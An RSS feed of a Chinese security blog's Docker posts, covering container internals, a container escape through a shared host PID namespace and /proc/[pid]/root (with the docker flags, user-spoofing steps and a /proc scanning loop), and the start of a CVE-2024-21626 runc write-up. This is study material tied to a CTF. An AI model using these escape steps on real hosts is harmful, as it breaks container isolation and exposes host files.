@@ -1,0 +1,276 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>docker on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/docker/</link><description>Recent content in docker on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 24 Mar 2024 23:55:43 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/docker/index.xml" rel="self" type="application/rss+xml"/><item><title>docker基础知识补全</title><link>https://amiaaaz.github.io/2024/03/24/docker-notes/</link><pubDate>Sun, 24 Mar 2024 23:55:43 +0800</pubDate><guid>https://amiaaaz.github.io/2024/03/24/docker-notes/</guid><description>&lt;h2 id="和虚拟机的区别">和虚拟机的区别&lt;/h2>
+&lt;p>*两者均可套娃&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240214212921646.png" alt="image-20240214212921646">&lt;/p>
+&lt;p>虚拟机基于Hypervisor，每台虚拟机都有独立的“虚拟 物理环境”，再在这之上构建完整的操作系统&lt;/p>
+&lt;p>容器则是在宿主机中，利用namespace和cgroup原本的linux特性 将进程隔离在封闭的环境中，也就是通过约束和修改进程的动态表现，从而创造出一个容器边界，再通过veth让进程的网络环境相互隔离，利用docker的网桥来进行容器进程之间的相互通信&lt;/p>
+&lt;p>容器技术本质是linux技术的组合&lt;/p>
+&lt;h2 id="隔离">隔离&lt;/h2>
+&lt;h3 id="namespace">namespace&lt;/h3>
+&lt;p>&lt;a href="https://www.cnblogs.com/blackbinbin/p/15562325.html">Docker容器基础入门认知-Namespce&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>docker run -it busybox /bin/sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>起一个简单的busybox容器，此时&lt;code>ps&lt;/code>只有两个进程&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240214213632236.png" alt="image-20240214213632236">&lt;/p>
+&lt;p>容器内部将初始的&lt;code>/bin/sh&lt;/code>视作pid=1，而宿主机中实际为pid=45204，这就是namespace的隔离机制&lt;/p>
+&lt;p>linux中创建进程的系统调用是clone，比如&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">pid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">clone&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">main_function&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">stack_size&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CLONE_NEWPID&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#111">SIGCHLD&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>创建新进程的同时返回pid，当指定CLONE_NEWPID时 新的进程就会“看到”一个全新的进程空间，以1为起始 它自己就是这个1&lt;/p>
+&lt;p>linux中的namespace有7个http://man7.org/linux/man-pages/man7/namespaces.7.html，分别是UTS, IPC, PID, Mount, Cgroups, User, Network&lt;/p>
+&lt;p>docker创建容器就是linux系统中的一次fork调用，flag参数可以控制namespace&lt;/p>
+&lt;h3 id="userns-remap">userns-remap&lt;/h3>
+&lt;p>docs: &lt;a href="https://docs.docker.com/engine/security/userns-remap/">https://docs.docker.com/engine/security/userns-remap/&lt;/a>&lt;/p>
+&lt;p>教程：&lt;a href="https://www.cnblogs.com/sparkdev/p/9614326.html">隔离 docker 容器中的用户&lt;/a>&lt;/p>
+&lt;p>在docker中 对于user namespace的隔离就是userns-remap，但属于&lt;u>默认未启用&lt;/u>的feature&lt;/p>
+&lt;p>容器中运行的服务尽量以非root的普通用户运行，如果必须在容器内使用root用户，就可以使用user namespace技术，将宿主机的普通用户映射成容器中的root用户&lt;/p>
+&lt;p>若启用，将影响文件挂载访问，并且所有容器都会启用用户隔离，可以通过&lt;code>--userns=host&lt;/code>参数对单个容器禁用用户隔离&lt;/p>
+&lt;h2 id="限制">限制&lt;/h2>
+&lt;h3 id="cgroup">Cgroup&lt;/h3>
+&lt;p>&lt;a href="https://www.cnblogs.com/blackbinbin/p/15597461.html">Docker容器基础入门认知-Cgroup&lt;/a>&lt;/p>
+&lt;p>通过namespace技术可以隔离（映射）容器的进程、用户等，但这并不是物理隔离，运行时如果不加限制还是会造成和宿主机的资源竞争&lt;/p>
+&lt;p>linux Control Group就是linux内核中为进程设置资源限制的重要技术，可以限制一个进程组能够使用的资源上限 包括CPU 内存 磁盘 网络等&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240215174951445.png" alt="image-20240215174951445">&lt;/p>
+&lt;p>如上图 &lt;code>/sys/fs/cgroup&lt;/code>下面诸如cpuset cou memory这样的子目录（或子系统），都是这台机器当前可以被Cgroups进行限制的资源种类，在这些目录之下可以列出指定资源被限制的方法&lt;/p>
+&lt;h2 id="文件系统">文件系统&lt;/h2>
+&lt;p>&lt;a href="https://zhuanlan.zhihu.com/p/374924046">手撕docker文件结构 —— overlayFS，image，container文件结构详解&lt;/a>&lt;/p>
+&lt;h3 id="rootfs">rootfs&lt;/h3>
+&lt;p>rootfs是每一个容器运行时内部可见的文件系统，即docker容器的根目录，我们运行docker exec命令进入container看到的文件系统就是rootfs&lt;/p>
+&lt;p>rootfs包含一个操作系统运行所需的文件系统，包含典型的类 Unix 操作系统中的目录系统，如 /dev、/proc、/bin、/etc、/lib、/usr、/tmp 及运行 docker 容器所需的配置文件、工具等&lt;/p>
+&lt;p>docker daemon为container挂载rootfs时也会先挂载为只读模式，与linux做法不同的是在这之后 docker daemon会利用&lt;strong>union mount联合挂载&lt;/strong>技术在已有的rootfs上再挂一个读写层，container在运行过程中文件系统发生的变化只会写到读写层，并通过whiteout技术隐藏只读层中的旧版本文件&lt;/p>
+&lt;h3 id="overlayfs">overlayFS&lt;/h3>
+&lt;p>上面提到union mount，可以理解为将不同功能目录进行合并 最后展现出合并后的文件系统&lt;/p>
+&lt;p>overlayFS是联合挂载技术的一种实现，linux内核为docker提供的overlayFS驱动有两种：overlay2和overlay，overlay2是相对于overlay的一种改进，在inode利用率方面比overlay更有效&lt;/p>
+&lt;p>overlayFS通过三种目录实现，它们合并出来的目录被称为merged目录&lt;/p>
+&lt;ul>
+&lt;li>lower目录：可以是多个，位于最底层（只读层）&lt;/li>
+&lt;li>upper目录：只有一个（读写层）&lt;/li>
+&lt;li>work目录：工作基础目录，挂载后内容会被清空，在使用过程中其内容对用户不可见&lt;/li>
+&lt;li>merged目录：联合挂载完后呈现给用户的统一视图，merged目录中实际没有实体文件，真正的文件在lower和upper中&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240215211752049.png" alt="image-20240215211752049">&lt;/p>
+&lt;p>我们可以直接实验这个overlayFS是如何运作的&lt;/p>
+&lt;pre tabindex="0">&lt;code>cd test
+mkdir -p A B C worker
+echo &amp;#34;From A&amp;#34; &amp;gt; A/a.txt
+echo &amp;#34;From A&amp;#34; &amp;gt; A/b.txt
+echo &amp;#34;From A&amp;#34; &amp;gt; A/c.txt
+echo &amp;#34;From B&amp;#34; &amp;gt; B/a.txt
+echo &amp;#34;From B&amp;#34; &amp;gt; B/d.txt
+echo &amp;#34;From C&amp;#34; &amp;gt; C/b.txt
+echo &amp;#34;From C&amp;#34; &amp;gt; C/e.txt
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>mkdir merged
+mount -t overlay overlay -o lowerdir=A:B,upperdir=C,workdir=worker merged
+&lt;/code>&lt;/pre>&lt;p>我们将A B作为lower目录（只读），C作为upper目录（读写），worker作为work目录，新建merged作为显示视图&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240215213052998.png" alt="image-20240215213052998">&lt;/p>
+&lt;p>由于挂载时使用了&lt;code>lowerdir=A:B&lt;/code>的参数，所以虽然同为lower目录 A在B之上，同名文件只保留A中的a.txt&lt;/p>
+&lt;p>如果我们此时删除视图merged中的a.txt，会发现A和B的a.txt都没有消失，读写层C还多了一个权限为c的a.txt&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240215221511394.png" alt="image-20240215221511394">&lt;/p>
+&lt;p>这个upper读写层中多出来的文件就叫whiteout文件，通过覆盖lower只读目录里的a.txt来表示该文件已经被删除&lt;/p>
+&lt;p>修改和删除同理，修改文件时使用copy on write写时复制技术，在未更改文件内容时，视图merged直接使用lower里的数据，只有当merged中的数据发生变化时 才会把变化的文件内容复制到读写层进行修改 并遮盖掉只读层中的老文件&lt;/p>
+&lt;h3 id="image-file-system">Image file system&lt;/h3>
+&lt;h4 id="存储结构">存储结构&lt;/h4>
+&lt;p>对于docker镜像 可以使用这样的命令查看镜像的overlay2结构目录&lt;/p>
+&lt;pre tabindex="0">&lt;code>docker image inspect ubuntu
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240215222716731.png" alt="image-20240215222716731">&lt;/p>
+&lt;p>进入这个镜像的读写upper目录，可以看到完整的ubuntu系统目录&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218162500732.png" alt="image-20240218162500732">&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240215223510207.png" alt="image-20240215223510207">&lt;/p>
+&lt;p>回退上一层，会发现只有diff, link, commited，并没有inspect中显示的merged, work目录&lt;/p>
+&lt;p>link和lower文件中的内容分别为当前层和下一层的软连接名字，如果当前层是底层，则不存在lower文件；真正的软链接文件都存在&lt;code>/var/lib/docker/overlay2/&lt;/code>目录下，分别指向对应层的diff目录&lt;/p>
+&lt;h4 id="image元数据">image元数据&lt;/h4>
+&lt;p>metadata存储在&lt;code>/var/lib/docker/image/&amp;lt;storage_driver&amp;gt;/imagedb/content/sha256/&lt;/code>目录下&lt;/p>
+&lt;p>新起一个ubuntu，image id为3db8720ecbf5，那这个busybox镜像的元数据就在&lt;code>/var/lib/docker/image/overlay2/imagedb/content/sha256/3db8720ecbf5......&lt;/code>中&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218163718021.png" alt="image-20240218163718021">&lt;/p>
+&lt;p>和docker image inspect中的信息基本一致，我们发现这些信息中都有很多sha256的id&lt;/p>
+&lt;pre tabindex="0">&lt;code>RootFS.Layers: d101c9453715a978a2a520f553588e77dfb4236762175eba61c5c264a449c75d (diff_id)
+ContainerConfig.Image: ce2eb53dff76baea369d58c2fcbe189f45c5c9f3f564f1879074378b00f3b2e7
+&lt;/code>&lt;/pre>&lt;p>这个镜像只有一层，如果有多层 那rootfs的diff_ids会有多个sha256 id，从上到下依次为镜像层的最低层到最顶层&lt;/p>
+&lt;p>上一个标题中讲到 镜像的每层文件都存储在&lt;code>/var/lib/docker/overlay2/&amp;lt;cache_id&amp;gt;&lt;/code>目录下，那镜像的diff_id是如何关联到实际存储的cache_id呢？&lt;/p>
+&lt;p>docker利用rootfs中的每个diff_id和历史信息&lt;strong>计算&lt;/strong>出与之对应的内容寻址的索引chain id，而chain id关联了cache_id，进而做到镜像关联到每一个镜像层的镜像文件&lt;/p>
+&lt;p>本例中：&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>image_id: ce2eb53dff76baea369d58c2fcbe189f45c5c9f3f564f1879074378b00f3b2e7&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>container_id: dad1032d40526458db14b2e043e6aebc981ea5b844e2e07e366964f604749fdd&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>container_name: pedantic_carson&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>layer_id(cache_id): 5e4eeab9b8f57db9c1a41e3db01bb141e77f92e931d2c1a112e73feaa6830883&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>存储相关文件位于&lt;code>/var/lib/docker/overlay2/&amp;lt;layer_id&amp;gt;&lt;/code>文件夹下&lt;/p>
+&lt;ul>
+&lt;li>diff_ids: d101c9453715a978a2a520f553588e77dfb4236762175eba61c5c264a449c75d&lt;/li>
+&lt;/ul>
+&lt;p>可以有很多层&lt;/p>
+&lt;ul>
+&lt;li>chain_id: d101c9453715a978a2a520f553588e77dfb4236762175eba61c5c264a449c75d&lt;/li>
+&lt;/ul>
+&lt;p>如果该镜像层已经是最底层（没有父镜像层），该层的diff_id便是chain_id，在&lt;code>/var/lib/docker/image/overlay2/layerdb/sha256/&amp;lt;chain_id&amp;gt;&lt;/code>文件夹下有相关文件&lt;/p>
+&lt;h4 id="layer元数据">layer元数据&lt;/h4>
+&lt;p>我们从diff_id得到chain_id，该如何关联cache_id呢？&lt;/p>
+&lt;p>docker中定义了Layer和RWLayer两种接口，分别用来定义只读层和可读写层的一些操作，又据此定义了roLayer和mountedLayer，分别实现了上述两种接口&lt;/p>
+&lt;ul>
+&lt;li>roLayer: 用于描述不可改变的镜像层&lt;/li>
+&lt;/ul>
+&lt;p>元数据位于&lt;code>/var/lib/docker/image/&amp;lt;storage_driver&amp;gt;/layerdb/sha256/&amp;lt;chain_id&amp;gt;&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218180829113.png" alt="image-20240218180829113">&lt;/p>
+&lt;p>如果非底层的layer，还会有parent文件 存放当前layer的父layer的diff_id；tar-split.json.gz是layer压缩包的split文件 通过这个文件可以还原layer的tar包，在docker save导出image时会用到&lt;/p>
+&lt;ul>
+&lt;li>mountedLayer: 用于描述可读写的容器层&lt;/li>
+&lt;/ul>
+&lt;p>元数据位于&lt;code>/var/lib/docker/image/&amp;lt;storage_driver&amp;gt;/layerdb/mounts/&amp;lt;container_id&amp;gt;/&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/v2-3edd6fd0e40c9cd799a2bd7ba785fc7f_r.jpg" alt="img">&lt;/p>
+&lt;h3 id="container-file-system">Container file system&lt;/h3>
+&lt;p>一个容器完整的层由三个部分组成：&lt;/p>
+&lt;ul>
+&lt;li>镜像层：即rootfs，提供容器启动的文件系统，也就是上一个三级标题中的image文件，镜像层书与roLayer&lt;/li>
+&lt;li>init层：用于修改容器中一些文件，如/etc/hostname, /etc/hosts/, /etc/resolv.conf等，属于mountedLayer&lt;/li>
+&lt;li>容器层：使用联合挂载统一给用户提供的可读写目录，属于mountedLayer&lt;/li>
+&lt;/ul>
+&lt;p>我们已经知道不变的镜像层的文件系统，现在来看init和容器层；还是以之前的ubuntu为例（各id不变），查看mountedLayer的元数据目录&lt;code>/var/lib/docker/image/&amp;lt;storage_driver&amp;gt;/layerdb/mounts/&amp;lt;container_id&amp;gt;/&lt;/code>查看数据&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218201715345.png" alt="image-20240218201715345">&lt;/p>
+&lt;ul>
+&lt;li>mount-id: 存储在/var/lib/docker/overlay2/的目录名称&lt;/li>
+&lt;li>init-id: 在mount-id的内容后加了一个-init，在/var/lib/docker/overlay2/下存在同名目录&lt;/li>
+&lt;li>parent: 容器所基于的镜像的最上层的chain_id&lt;/li>
+&lt;/ul>
+&lt;p>查看&lt;code>/var/lib/docker/overlay2/b1b45902c49293c95e8abe8838bcade06336b2a2ae33bd5a09d17151fac81554-init&lt;/code>的内容&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218202156489.png" alt="image-20240218202156489">&lt;/p>
+&lt;p>可以看到除了常规文件外只有少数配置文件；需要这一层的原因是当容器启动时，这些本该属于镜像层的文件或目录，比如hostname, 用户等需要修改，但image层又不允许修改，所以启动时通过单独挂载一层init层，通过修改init层中的文件达到修改这些文件的目的，而这些修改往往只对当前容器生效，在docker commit提交为镜像的时候 并不会将init提交&lt;/p>
+&lt;p>再看容器层的内容（目录名去掉-init）：&lt;/p>
+&lt;p>/var/lib/docker/overlay2/b1b45902c49293c95e8abe8838bcade06336b2a2ae33bd5a09d17151fac81554/&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218204009067.png" alt="image-20240218204009067">&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218204020762.png" alt="image-20240218204020762">&lt;/p>
+&lt;p>我们想要的容器内实际的文件终于在./merged/文件夹找到了，它就是由镜像层，init层与容器层联合挂载得到的（就像最初overlayFS小实验中的merged目录一样）&lt;/p>
+&lt;p>而同级的diff目录下就保存了针对文件的修改，添加一般文件则是正常读写权限，而删除init中原本就有的 则为whiteout文件 权限为c&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/v2-f5b3a16fead0e7ab855d3d10578a7d7c_r.jpg" alt="img">&lt;/p></description></item><item><title>共享宿主机PID namespace与容器逃逸</title><link>https://amiaaaz.github.io/2024/03/24/pid-namespace-share-and-escape/</link><pubDate>Sun, 24 Mar 2024 23:52:57 +0800</pubDate><guid>https://amiaaaz.github.io/2024/03/24/pid-namespace-share-and-escape/</guid><description>&lt;h2 id="前提">前提&lt;/h2>
+&lt;ul>
+&lt;li>容器共享宿主机PID name space（非常苛刻 这属于docker默认开启的安全措施）&lt;/li>
+&lt;li>以uid为0运行&lt;/li>
+&lt;li>没有启用user namespace（默认就不启用）&lt;/li>
+&lt;li>没有添加额外的capbilities&lt;/li>
+&lt;/ul>
+&lt;p>可以利用某些进程的&lt;code>/proc/[pid]/root&lt;/code>实现逃逸&lt;/p>
+&lt;p>理想docker启动命令：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>docker run --rm -it --pid&lt;span style="color:#f92672">=&lt;/span>host --security-opt&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">apparmor&lt;/span>&lt;span style="color:#f92672">=&lt;/span>unconfined ubuntu bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="procpidroot">/proc/[pid]/root&lt;/h2>
+&lt;p>根据proc(5)介绍，通过该符号链接可以访问任意进程的rootfs，如论当前进程和目标进程是否属于同一mount namespace，而调用/访问该符号链接需要经过ptrace(2)的权限检查&lt;/p>
+&lt;p>根据手册，ptrace access mode checking会基于两进程的credentials和capabilities进行检查，其中的&lt;code>PTRACE_MODE_READ&lt;/code>就是针对符号链接的访问&lt;/p>
+&lt;p>那具体这个check会如何进行呢？相关函数调用关系如下&lt;/p>
+&lt;pre tabindex="0">&lt;code>/proc/[pid]/root
+-&amp;gt; proc_pid_get_link() # 获取链接的实际路径
+-&amp;gt; proc_fd_access_allowed() # 检查权限 通过符号链接的inode拿到进程的task_struct实例
+-&amp;gt; ptrace_may_access() # 检查权限 调用该函数时第二个参数为PTRACE_MODE_READ_FSCREDS
+-&amp;gt; security_ptrace_access_check()
+-&amp;gt; cap_ptrace_access_check()
+&lt;/code>&lt;/pre>&lt;p>在ptrace_may_access中完全允许同一线程组进行访问&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218210450630.png" alt="image-20240218210450630">&lt;/p>
+&lt;p>因为有标志位，需要检查当前进程和目标进程的fsuid和fsgid是否一致，如果不一致就会调用ptrace_has_cap()检查当前进程在目标进程的name userspace中是否拥有CAP_SYS_PTRACE权限，如果没有则拒绝访问&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218212029516.png" alt="image-20240218212029516">&lt;/p>
+&lt;p>如果以上都顺利则跳转ok部分，当目标进程被设置为nondumpable且当前进程在目标进程的user namespace中没有CAP_SYS_PTRACE权限时拒绝访问&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218212344103.png" alt="image-20240218212344103">&lt;/p>
+&lt;p>最后调用security_ptrace_access_check()进行最终检查（和LSM有关 略过yama等的实现），对于commcap, security_ptrace_access_check()最终调用的时/security/commcap.c文件中的cap_ptrace_access_check()函数&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218212714427.png" alt="image-20240218212714427">&lt;/p>
+&lt;p>根据是否设置标志位来决定使用effective capbility set有效能力集还是permitted capbility set许可能力集执行权限检查，接着如果两进程属于同一user namespace 且目标进程的许可能力集是当前进程能力集的子集，则通过检查，否则接着检查当前进程在目标进程所在的user namespace中是否拥有CAP_SYS_PTRACE能力，有则通过&lt;/p>
+&lt;p>在默认配置下所有容器拥有相同的能力集，所以共享了宿主机PID namespace的容器能够访问其它容器进程的rootfs&lt;/p>
+&lt;p>无法访问宿主机上以非root用户运行进程的rootfs，是因为当前进程/调用进程的fsuid, fsgid分别与目标进程的euid, suid, uid, egid, sgid, gid不匹配；无法访问宿主机上以root用户运行进程的rootfs，是因为能力集的问题（非子集）&lt;/p>
+&lt;h2 id="利用思路">利用思路&lt;/h2>
+&lt;p>根据以上研究，我们可以有这样的结论&lt;/p>
+&lt;ul>
+&lt;li>调用进程和目标进程属于统一个进程组，允许访问&lt;/li>
+&lt;li>如果访问模式中指定PTRACE_MODE_FSCREDS标志位，则在接下来检查调用进程的filesystem UID(fsuid)和filesystem GID(fsgid)，如果指定PTRACE_MODE_REALCREDS标志位，则检查real UID(uid)和real GID(gid)&lt;/li>
+&lt;li>调用进程的fsuid, fsgid需要分别与目标进程的euid, suid, uid, egid, sgid, gid匹配&lt;/li>
+&lt;li>调用进程在目标进程的user namespace中需要拥有CAP_SYS_PTRACE能力&lt;/li>
+&lt;li>如果目标进程被设置为nondumpable，且调用进程在目标进程的user namespace中没有CAP_SYS_PTRACE能力，那么拒绝访问&lt;/li>
+&lt;li>如果不能满足以下任意一个条件，那么内核的commcap LSM模块会拒绝访问：
+&lt;ul>
+&lt;li>调用进程和目标进程属于同一个user namespace，且调用进程的能力集是目标进程的许可能力集的超集&lt;/li>
+&lt;li>调用进程在目标进程所在的user namespace中拥有CAP_SYS_PTRACE能力&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>所以可以如何逃逸？我是没想出来，Nitro师傅：&lt;/p>
+&lt;ul>
+&lt;li>解决fsuid等不匹配：通过PID namespace共享找到宿主机上以非root用户运行的进程，我们在容器中创建一个uid和gid都与目标进程uid gid相同的用户，再在容器中su切换，就有权限访问目标进程的/proc/[pid]/root了，这个目标进程必须是dumpable的&lt;/li>
+&lt;/ul>
+&lt;p>非常好理解，但是也非常苛刻：我们怎么知道目标进程的uid和gid呢？&lt;/p>
+&lt;h2 id="实操">实操&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>docker run --rm -it --pid host ubuntu
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样flag下运行的docker，可以显示和宿主机一样的进程列表&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218215359045.png" alt="image-20240218215359045">&lt;/p>
+&lt;p>在其中我们可以找到以普通权限运行的进程&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ps -a -o pid,ppid,user,group,args
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218215825070.png" alt="image-20240218215825070">&lt;/p>
+&lt;p>我们创建对应用户&lt;/p>
+&lt;pre tabindex="0">&lt;code>useradd -m -u 1000 -U nise
+su nise
+&lt;/code>&lt;/pre>&lt;p>但是却没办法做到&lt;code>ls -l /proc/[pid]/root/&lt;/code>，permission denied&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218223210267.png" alt="image-20240218223210267">&lt;/p>
+&lt;p>看了一下以这个为原型的RWCTF 2024的题，原来docker flag还需要加上这个flag&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>docker run --rm -it --pid&lt;span style="color:#f92672">=&lt;/span>host --security-opt&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">apparmor&lt;/span>&lt;span style="color:#f92672">=&lt;/span>unconfined ubuntu bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218223813997.png" alt="image-20240218223813997">&lt;/p>
+&lt;p>即&lt;code>--security-opt=apparmor=unconfined&lt;/code>选项同时开启的情况下，可以完成逃逸&lt;/p>
+&lt;p>简便措施：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> fd in &lt;span style="color:#d88200">`&lt;/span>find /proc/*/root&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">do&lt;/span> ls -al &lt;span style="color:#111">$fd&lt;/span> &lt;span style="color:#111">|&lt;/span> grep &lt;span style="color:#8045ff">\&amp;gt;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">done&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接找哪些进程的root能打开&lt;/p>
+&lt;hr>
+&lt;p>anyway, but&lt;/p>
+&lt;p>和进程安全有关的选项，如果谁脑子想不开了用这个flag，想必它的主机也不安全&lt;/p>
+&lt;p>参考文章：&lt;/p>
+&lt;p>&lt;a href="https://www.anquanke.com/post/id/290540">一个未公开的容器逃逸方式&lt;/a>&lt;/p>
+&lt;p>RWCTF 2024 出题思路&amp;amp;wp: &lt;a href="https://github.com/WinMin/Be-a-Docker-Escaper/blob/main/Be-a-Docker-Escaper-4/README.md">https://github.com/WinMin/Be-a-Docker-Escaper/blob/main/Be-a-Docker-Escaper-4/README.md&lt;/a>&lt;/p></description></item><item><title>CVE-2024-21626复现</title><link>https://amiaaaz.github.io/2024/03/24/cve-2024-21626/</link><pubDate>Sun, 24 Mar 2024 23:48:23 +0800</pubDate><guid>https://amiaaaz.github.io/2024/03/24/cve-2024-21626/</guid><description>&lt;p>公告：&lt;a href="https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv">several container breakouts due to internally leaked fds&lt;/a>&lt;/p>
+&lt;p>影响范围：runc &amp;gt;=v1.0.0-rc93,&amp;lt;=1.1.11&lt;/p>
+&lt;p>额外要求：linux内核版本大于5.6 (uname -r)&lt;/p>
+&lt;p>检查方式&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240213163353866.png" alt="image-20240213163353866">&lt;/p>
+&lt;h2 id="runc">runc&lt;/h2>
+&lt;p>docker中的默认runtime是runc，它是基于OCI specification编写的一个容器底层运行时，可以手动替换为安全性更高、隔离性更强的gvisor(runc)，也是基于OCI规范 可以无缝切换&lt;/p>
+&lt;p>作为底层工具，当runc出现问题会影响docker和k8s&lt;/p>
+&lt;h2 id="原理">原理&lt;/h2>
+&lt;p>&lt;code>prepareOpenat2&lt;/code>函数会检查&lt;code>openat2&lt;/code>这个syscall能否被正常调用，若失败 进入到&lt;code>openFallback&lt;/code>，若成功 则用&lt;code>unix.Openat2&lt;/code>系统调用打开&lt;code>/sys/fs/cgroup&lt;/code>，这里的&lt;code>unix.Openat2&lt;/code>是有&lt;code>O_CLOEXEC&lt;/code>flag的&lt;/p>
+&lt;p>如果成功打开&lt;code>/sys/fs/cgroup&lt;/code>，必然有一个fd指向该文件夹，但&lt;code>prepareOpenat2&lt;/code>函数执行完之后并没有把这个fd正常关闭 也没有返回 导致泄露&lt;/p>
